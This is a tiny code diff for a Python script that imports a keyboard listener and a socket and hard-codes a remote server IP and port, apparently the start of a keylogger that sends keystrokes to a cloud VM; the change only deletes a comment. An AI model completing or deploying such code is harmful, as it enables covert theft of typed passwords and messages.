@@ -1,7 +1,6 @@
 import socket
 from pynput.keyboard import Listener, Key
 
-# Replace with the external IP of your Google Cloud VM
 SERVER_IP = '35.226.246.163'
 SERVER_PORT = 9999
 
